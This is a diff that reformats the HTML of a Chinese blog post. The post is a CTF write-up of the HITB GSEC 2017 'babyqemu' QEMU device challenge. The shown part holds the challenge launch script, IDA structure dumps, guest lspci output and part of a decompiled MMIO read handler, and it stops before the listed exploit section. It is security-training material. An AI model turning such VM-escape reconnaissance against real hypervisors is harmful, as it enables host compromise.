@@ -1,31 +1,7 @@
-<!doctype html><html lang=zh-cn>
-<head>
-<meta charset=utf-8>
-<meta http-equiv=x-ua-compatible content="IE=edge,chrome=1">
-<title>HITB GSEC 2017：babyqemu - hhdx's blog</title>
-<meta name=renderer content="webkit">
-<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
-<meta http-equiv=cache-control content="no-transform">
-<meta http-equiv=cache-control content="no-siteapp">
-<meta name=theme-color content="#f8f5ec">
-<meta name=msapplication-navbutton-color content="#f8f5ec">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec">
-<meta name=author content="hhdx"><meta name=description content="题目下载地址：babyqemu.tar.gz
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><title>HITB GSEC 2017：babyqemu - hhdx's blog</title><meta name=renderer content="webkit"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta http-equiv=cache-control content="no-transform"><meta http-equiv=cache-control content="no-siteapp"><meta name=theme-color content="#f8f5ec"><meta name=msapplication-navbutton-color content="#f8f5ec"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="#f8f5ec"><meta name=author content="hhdx"><meta name=description content="题目下载地址：babyqemu.tar.gz
 分析 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
-1 2 3 4 5 6 7 8 9 10  #! /bin/sh ./qemu-system-x86_64 \ -initrd ./rootfs.cpio \ -kernel ./vmlinuz-4.8.0-52-generic \ -append &amp;#39;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;#39; \ -enable-kvm \  # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉 -monitor /dev/null \ -m 64M --nographic -L ./dependency/usr/local/share/qemu \ -L pc-bios \ -device hitb,id=vda   在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。
-"><meta name=keywords content="C language,CTF,system engineer">
-<meta name=generator content="Hugo 0.88.1 with theme even">
-<link rel=canonical href=https://hhdx.xyz/post/babyqemu/>
-<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
-<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
-<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
-<link rel=manifest href=/manifest.json>
-<link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5>
-<link href=/sass/main.min.0d3b8ec8ed7df891edf32830bfdc6af5976dc6b9ffeb7cd1d0cdd312bcf8e23e.css rel=stylesheet>
-<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous>
-<meta property="og:title" content="HITB GSEC 2017：babyqemu">
-<meta property="og:description" content="题目下载地址：babyqemu.tar.gz
+1 2 3 4 5 6 7 8 9 10 #! /bin/sh ./qemu-system-x86_64 \ -initrd ./rootfs.cpio \ -kernel ./vmlinuz-4.8.0-52-generic \ -append &amp;#39;console=ttyS0 root=/dev/ram oops=panic panic=1&amp;#39; \ -enable-kvm \ # 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉 -monitor /dev/null \ -m 64M --nographic -L ./dependency/usr/local/share/qemu \ -L pc-bios \ -device hitb,id=vda 在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。
+"><meta name=keywords content="C language,CTF,system engineer"><meta name=generator content="Hugo 0.116.1 with theme even"><link rel=canonical href=https://hhdx.xyz/post/babyqemu/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/manifest.json><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link href=/sass/main.min.bda6190ea12800aa36851bdb7b5cb5af46ca988222781d28b20a96aa4c1f6e68.css rel=stylesheet><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin=anonymous><meta property="og:title" content="HITB GSEC 2017：babyqemu"><meta property="og:description" content="题目下载地址：babyqemu.tar.gz
 分析
 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 
@@ -54,13 +30,7 @@ tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 -device hitb,id=vda
 
 
-在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。">
-<meta property="og:type" content="article">
-<meta property="og:url" content="https://hhdx.xyz/post/babyqemu/"><meta property="article:section" content="post">
-<meta property="article:published_time" content="2020-11-30T12:05:03+00:00">
-<meta property="article:modified_time" content="2020-11-30T12:05:03+00:00">
-<meta itemprop=name content="HITB GSEC 2017：babyqemu">
-<meta itemprop=description content="题目下载地址：babyqemu.tar.gz
+在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><meta property="og:type" content="article"><meta property="og:url" content="https://hhdx.xyz/post/babyqemu/"><meta property="article:section" content="post"><meta property="article:published_time" content="2020-11-30T12:05:03+00:00"><meta property="article:modified_time" content="2020-11-30T12:05:03+00:00"><meta itemprop=name content="HITB GSEC 2017：babyqemu"><meta itemprop=description content="题目下载地址：babyqemu.tar.gz
 分析
 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 
@@ -89,12 +59,7 @@ tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 -device hitb,id=vda
 
 
-在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><meta itemprop=datePublished content="2020-11-30T12:05:03+00:00">
-<meta itemprop=dateModified content="2020-11-30T12:05:03+00:00">
-<meta itemprop=wordCount content="3092">
-<meta itemprop=keywords content="qemu,CTF,"><meta name=twitter:card content="summary">
-<meta name=twitter:title content="HITB GSEC 2017：babyqemu">
-<meta name=twitter:description content="题目下载地址：babyqemu.tar.gz
+在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><meta itemprop=datePublished content="2020-11-30T12:05:03+00:00"><meta itemprop=dateModified content="2020-11-30T12:05:03+00:00"><meta itemprop=wordCount content="3101"><meta itemprop=keywords content="qemu,CTF,"><meta name=twitter:card content="summary"><meta name=twitter:title content="HITB GSEC 2017：babyqemu"><meta name=twitter:description content="题目下载地址：babyqemu.tar.gz
 分析
 tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 
@@ -124,89 +89,9 @@ tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 
 
 在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到HitbState结构体，其中还包含dma_state结构体。"><!--[if lte IE 9]><script src=https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js></script><![endif]--><!--[if lt IE 9]><script src=https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js></script>
-<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]-->
-</head>
-<body>
-<div id=mobile-navbar class=mobile-navbar>
-<div class=mobile-header-logo>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<div class=mobile-navbar-icon>
+<script src=https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js></script><![endif]--></head><body><div id=mobile-navbar class=mobile-navbar><div class=mobile-header-logo><a href=/ class=logo>hhdx's blog</a></div><div class=mobile-navbar-icon><span></span>
 <span></span>
-<span></span>
-<span></span>
-</div>
-</div>
-<nav id=mobile-menu class="mobile-menu slideout-menu">
-<ul class=mobile-menu-list>
-<a href=/>
-<li class=mobile-menu-item>Home</li>
-</a><a href=/post/>
-<li class=mobile-menu-item>Archives</li>
-</a><a href=/tags/>
-<li class=mobile-menu-item>Tags</li>
-</a><a href=/links/>
-<li class=mobile-menu-item>Links</li>
-</a><a href=/about/>
-<li class=mobile-menu-item>About</li>
-</a>
-</ul>
-</nav>
-<div class=container id=mobile-panel>
-<header id=header class=header>
-<div class=logo-wrapper>
-<a href=/ class=logo>hhdx's blog</a>
-</div>
-<nav class=site-navbar>
-<ul id=menu class=menu>
-<li class=menu-item>
-<a class=menu-item-link href=/>Home</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/post/>Archives</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/tags/>Tags</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/links/>Links</a>
-</li><li class=menu-item>
-<a class=menu-item-link href=/about/>About</a>
-</li>
-</ul>
-</nav>
-</header>
-<main id=main class=main>
-<div class=content-wrapper>
-<div id=content class=content>
-<article class=post>
-<header class=post-header>
-<h1 class=post-title>HITB GSEC 2017：babyqemu</h1>
-<div class=post-meta>
-<span class=post-time> 2020-11-30 </span>
-</div>
-</header>
-<div class=post-toc id=post-toc>
-<h2 class=post-toc-title>文章目录</h2>
-<div class="post-toc-content always-active">
-<nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#分析>分析</a></li>
-<li><a href=#漏洞点>漏洞点</a></li>
-<li><a href=#exploit>exploit</a></li>
-<li><a href=#参考>参考</a></li>
-</ul>
-</li>
-</ul>
-</nav>
-</div>
-</div>
-<div class=post-content>
-<p>题目下载地址：<a href=https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz>babyqemu.tar.gz</a></p>
-<h2 id=分析>分析</h2>
-<p><code>tar xvzf babyqemu.tar.gz</code>解压看到启动脚本<code>launch.sh</code></p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+<span></span></div></div><nav id=mobile-menu class="mobile-menu slideout-menu"><ul class=mobile-menu-list><a href=/><li class=mobile-menu-item>Home</li></a><a href=/post/><li class=mobile-menu-item>Archives</li></a><a href=/tags/><li class=mobile-menu-item>Tags</li></a><a href=/links/><li class=mobile-menu-item>Links</li></a><a href=/about/><li class=mobile-menu-item>About</li></a></ul></nav><div class=container id=mobile-panel><header id=header class=header><div class=logo-wrapper><a href=/ class=logo>hhdx's blog</a></div><nav class=site-navbar><ul id=menu class=menu><li class=menu-item><a class=menu-item-link href=/>Home</a></li><li class=menu-item><a class=menu-item-link href=/post/>Archives</a></li><li class=menu-item><a class=menu-item-link href=/tags/>Tags</a></li><li class=menu-item><a class=menu-item-link href=/links/>Links</a></li><li class=menu-item><a class=menu-item-link href=/about/>About</a></li></ul></nav></header><main id=main class=main><div class=content-wrapper><div id=content class=content><article class=post><header class=post-header><h1 class=post-title>HITB GSEC 2017：babyqemu</h1><div class=post-meta><span class=post-time>2020-11-30</span></div></header><div class=post-toc id=post-toc><h2 class=post-toc-title>文章目录</h2><div class="post-toc-content always-active"><nav id=TableOfContents><ul><li><ul><li><a href=#分析>分析</a></li><li><a href=#漏洞点>漏洞点</a></li><li><a href=#exploit>exploit</a></li><li><a href=#参考>参考</a></li></ul></li></ul></nav></div></div><div class=post-content><p>题目下载地址：<a href=https://github.com/kitctf/writeups/blob/master/hitb-gsec-2017/babyqemu/babyqemu.tar.gz>babyqemu.tar.gz</a></p><h2 id=分析>分析</h2><p><code>tar xvzf babyqemu.tar.gz</code>解压看到启动脚本<code>launch.sh</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -216,24 +101,17 @@ tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 </span><span class=lnt> 8
 </span><span class=lnt> 9
 </span><span class=lnt>10
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=cp>#! /bin/sh
-</span><span class=cp></span>./qemu-system-x86_64 <span class=se>\
-</span><span class=se></span>-initrd ./rootfs.cpio <span class=se>\
-</span><span class=se></span>-kernel ./vmlinuz-4.8.0-52-generic <span class=se>\
-</span><span class=se></span>-append <span class=s1>&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> <span class=se>\
-</span><span class=se></span>-enable-kvm <span class=se>\ </span>    <span class=c1># 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉</span>
--monitor /dev/null <span class=se>\
-</span><span class=se></span>-m 64M --nographic  -L ./dependency/usr/local/share/qemu <span class=se>\
-</span><span class=se></span>-L pc-bios <span class=se>\
-</span><span class=se></span>-device hitb,id<span class=o>=</span>vda
-</code></pre></td></tr></table>
-</div>
-</div><p>在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到<code>HitbState</code>结构体，其中还包含<code>dma_state</code>结构体。</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl><span class=cp>#! /bin/sh
+</span></span></span><span class=line><span class=cl><span class=cp></span>./qemu-system-x86_64 <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-initrd ./rootfs.cpio <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-kernel ./vmlinuz-4.8.0-52-generic <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-append <span class=s1>&#39;console=ttyS0 root=/dev/ram oops=panic panic=1&#39;</span> <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-enable-kvm <span class=se>\ </span>    <span class=c1># 需要CPU virtualization，现在与hyper-v共存的VMware不支持此选项。可以删掉</span>
+</span></span><span class=line><span class=cl>-monitor /dev/null <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-m 64M --nographic  -L ./dependency/usr/local/share/qemu <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-L pc-bios <span class=se>\
+</span></span></span><span class=line><span class=cl><span class=se></span>-device hitb,id<span class=o>=</span>vda
+</span></span></code></pre></td></tr></table></div></div><p>在最后一行可以看到设备名称为hitb，在ida左侧Functions window，ctrl+f搜索hitb就可以找到相关函数。通过在ida的Local Types窗口搜索hitb可以找到<code>HitbState</code>结构体，其中还包含<code>dma_state</code>结构体。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -275,56 +153,49 @@ tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 </span><span class=lnt>40
 </span><span class=lnt>41
 </span><span class=lnt>42
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback>00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1495)
-00000000 pdev            PCIDevice_0 ?
-000009F0 mmio            MemoryRegion_0 ?
-00000AF0 thread          QemuThread_0 ?
-00000AF8 thr_mutex       QemuMutex_0 ?
-00000B20 thr_cond        QemuCond_0 ?
-00000B50 stopping        db ?
-00000B51                 db ? ; undefined
-00000B52                 db ? ; undefined
-00000B53                 db ? ; undefined
-00000B54 addr4           dd ?
-00000B58 fact            dd ?
-00000B5C status          dd ?
-00000B60 irq_status      dd ?
-00000B64                 db ? ; undefined
-00000B65                 db ? ; undefined
-00000B66                 db ? ; undefined
-00000B67                 db ? ; undefined
-00000B68 dma             dma_state ?
-00000B88 dma_timer       QEMUTimer_0 ?
-00000BB8 dma_buf         db 4096 dup(?)
-00001BB8 enc             dq ?                    ; offset
-00001BC0 dma_mask        dq ?
-00001BC8                 db ? ; undefined
-00001BC9                 db ? ; undefined
-00001BCA                 db ? ; undefined
-00001BCB                 db ? ; undefined
-00001BCC                 db ? ; undefined
-00001BCD                 db ? ; undefined
-00001BCE                 db ? ; undefined
-00001BCF                 db ? ; undefined
-00001BD0 HitbState       ends
-00001BD0
-00000000 ; ---------------------------------------------------------------------------
-00000000
-00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1493)
-00000000                                         ; XREF: HitbState/r
-00000000 src             dq ?
-00000008 dst             dq ?
-00000010 cnt             dq ?
-00000018 cmd             dq ?
-00000020 dma_state       ends
-</code></pre></td></tr></table>
-</div>
-</div><p>通过查看<code>hitb_class_init</code>函数找到vendor_id和device_id。在虚拟机里面查看具体信息。（这个busybox+kernel的虚拟机中的<code>lspci</code>指令比常规少一些选项，不像前一个题目STRNG中是一个完整的ubuntu发行版）</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>00000000 HitbState       struc ; (sizeof=0x1BD0, align=0x10, copyof_1495)
+</span></span><span class=line><span class=cl>00000000 pdev            PCIDevice_0 ?
+</span></span><span class=line><span class=cl>000009F0 mmio            MemoryRegion_0 ?
+</span></span><span class=line><span class=cl>00000AF0 thread          QemuThread_0 ?
+</span></span><span class=line><span class=cl>00000AF8 thr_mutex       QemuMutex_0 ?
+</span></span><span class=line><span class=cl>00000B20 thr_cond        QemuCond_0 ?
+</span></span><span class=line><span class=cl>00000B50 stopping        db ?
+</span></span><span class=line><span class=cl>00000B51                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B52                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B53                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B54 addr4           dd ?
+</span></span><span class=line><span class=cl>00000B58 fact            dd ?
+</span></span><span class=line><span class=cl>00000B5C status          dd ?
+</span></span><span class=line><span class=cl>00000B60 irq_status      dd ?
+</span></span><span class=line><span class=cl>00000B64                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B65                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B66                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B67                 db ? ; undefined
+</span></span><span class=line><span class=cl>00000B68 dma             dma_state ?
+</span></span><span class=line><span class=cl>00000B88 dma_timer       QEMUTimer_0 ?
+</span></span><span class=line><span class=cl>00000BB8 dma_buf         db 4096 dup(?)
+</span></span><span class=line><span class=cl>00001BB8 enc             dq ?                    ; offset
+</span></span><span class=line><span class=cl>00001BC0 dma_mask        dq ?
+</span></span><span class=line><span class=cl>00001BC8                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BC9                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BCA                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BCB                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BCC                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BCD                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BCE                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BCF                 db ? ; undefined
+</span></span><span class=line><span class=cl>00001BD0 HitbState       ends
+</span></span><span class=line><span class=cl>00001BD0
+</span></span><span class=line><span class=cl>00000000 ; ---------------------------------------------------------------------------
+</span></span><span class=line><span class=cl>00000000
+</span></span><span class=line><span class=cl>00000000 dma_state       struc ; (sizeof=0x20, align=0x8, copyof_1493)
+</span></span><span class=line><span class=cl>00000000                                         ; XREF: HitbState/r
+</span></span><span class=line><span class=cl>00000000 src             dq ?
+</span></span><span class=line><span class=cl>00000008 dst             dq ?
+</span></span><span class=line><span class=cl>00000010 cnt             dq ?
+</span></span><span class=line><span class=cl>00000018 cmd             dq ?
+</span></span><span class=line><span class=cl>00000020 dma_state       ends
+</span></span></code></pre></td></tr></table></div></div><p>通过查看<code>hitb_class_init</code>函数找到vendor_id和device_id。在虚拟机里面查看具体信息。（这个busybox+kernel的虚拟机中的<code>lspci</code>指令比常规少一些选项，不像前一个题目STRNG中是一个完整的ubuntu发行版）</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -355,46 +226,38 @@ tar xvzf babyqemu.tar.gz解压看到启动脚本launch.sh
 </span><span class=lnt>29
 </span><span class=lnt>30
 </span><span class=lnt>31
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ lspci --help
-BusyBox v1.26.2 <span class=o>(</span>2017-05-26 14:27:34 CST<span class=o>)</span> multi-call binary.
-
-Usage: lspci <span class=o>[</span>-mk<span class=o>]</span>
-
-List all PCI devices
-
-	-m	Parsable output
-	-k	Show driver
-$ lspci
-00:00.0 Class 0600: 8086:1237
-00:01.3 Class 0680: 8086:7113
-00:03.0 Class 0200: 8086:100e
-00:01.1 Class 0101: 8086:7010
-00:02.0 Class 0300: 1234:1111
-00:01.0 Class 0601: 8086:7000
-00:04.0 Class 00ff: 1234:2333
-$ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span>00<span class=se>\:</span>04.0/resource
-0x00000000fea00000 0x00000000feafffff 0x0000000000040200
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-0x0000000000000000 0x0000000000000000 0x0000000000000000
-</code></pre></td></tr></table>
-</div>
-</div><p>在<code>pci_hitb_realize</code>函数中观察到使用<code>timer_init_tl</code>初始化了一个timer时钟，和通过<code>memory_region_init_io</code>初始化了MMIO。</p>
-<p>MMIO的<code>hitb_mmio_read</code>函数</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>$ lspci --help
+</span></span><span class=line><span class=cl>BusyBox v1.26.2 <span class=o>(</span>2017-05-26 14:27:34 CST<span class=o>)</span> multi-call binary.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Usage: lspci <span class=o>[</span>-mk<span class=o>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>List all PCI devices
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>	-m	Parsable output
+</span></span><span class=line><span class=cl>	-k	Show driver
+</span></span><span class=line><span class=cl>$ lspci
+</span></span><span class=line><span class=cl>00:00.0 Class 0600: 8086:1237
+</span></span><span class=line><span class=cl>00:01.3 Class 0680: 8086:7113
+</span></span><span class=line><span class=cl>00:03.0 Class 0200: 8086:100e
+</span></span><span class=line><span class=cl>00:01.1 Class 0101: 8086:7010
+</span></span><span class=line><span class=cl>00:02.0 Class 0300: 1234:1111
+</span></span><span class=line><span class=cl>00:01.0 Class 0601: 8086:7000
+</span></span><span class=line><span class=cl>00:04.0 Class 00ff: 1234:2333
+</span></span><span class=line><span class=cl>$ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span>00<span class=se>\:</span>04.0/resource
+</span></span><span class=line><span class=cl>0x00000000fea00000 0x00000000feafffff 0x0000000000040200
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span><span class=line><span class=cl>0x0000000000000000 0x0000000000000000 0x0000000000000000
+</span></span></code></pre></td></tr></table></div></div><p>在<code>pci_hitb_realize</code>函数中观察到使用<code>timer_init_tl</code>初始化了一个timer时钟，和通过<code>memory_region_init_io</code>初始化了MMIO。</p><p>MMIO的<code>hitb_mmio_read</code>函数</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -452,80 +315,65 @@ $ cat /sys/devices/pci0000<span class=se>\:</span>00/0000<span class=se>\:</span
 </span><span class=lnt>56
 </span><span class=lnt>57
 </span><span class=lnt>58
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=kt>uint64_t</span> <span class=kr>__fastcall</span> <span class=nf>hitb_mmio_read</span><span class=p>(</span><span class=n>HitbState</span> <span class=o>*</span><span class=n>opaque</span><span class=p>,</span> <span class=n>hwaddr</span> <span class=n>addr</span><span class=p>,</span> <span class=kt>unsigned</span> <span class=kt>int</span> <span class=n>size</span><span class=p>)</span>
-<span class=p>{</span>
-  <span class=kt>uint64_t</span> <span class=n>result</span><span class=p>;</span> <span class=c1>// rax
-</span><span class=c1></span>  <span class=kt>uint64_t</span> <span class=n>val</span><span class=p>;</span> <span class=c1>// [rsp+0h] [rbp-20h]
-</span><span class=c1></span>
-  <span class=n>result</span> <span class=o>=</span> <span class=o>-</span><span class=mi>1LL</span><span class=p>;</span>
-  <span class=k>if</span> <span class=p>(</span> <span class=n>size</span> <span class=o>==</span> <span class=mi>4</span> <span class=p>)</span>
-  <span class=p>{</span>
-    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x80</span> <span class=p>)</span>
-      <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span><span class=p>;</span>
-    <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&gt;</span> <span class=mh>0x80</span> <span class=p>)</span>
-    <span class=p>{</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x8C</span> <span class=p>)</span>
-        <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=n>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
-      <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>&lt;=</span> <span class=mh>0x8C</span> <span class=p>)</span>
-      <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x84</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=o>*</span><span class=p>(</span><span class=n>dma_addr_t</span> <span class=o>*</span><span class=p>)((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=o>&amp;</span><span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>src</span> <span class=o>+</span> <span class=mi>4</span><span class=p>);</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x88</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>dst</span><span class=p>;</span>
-      <span class=p>}</span>
-      <span class=k>else</span>
-      <span class=p>{</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x90</span> <span class=p>)</span>
-          <span class=k>return</span> <span class=n>opaque</span><span class=o>-&gt;</span><span class=n>dma</span><span class=p>.</span><span class=n>cnt</span><span class=p>;</span>
-        <span class=k>if</span> <span class=p>(</span> <span class=n>addr</span> <span class=o>==</span> <span class=mh>0x98</span> <span class=p>)</span>
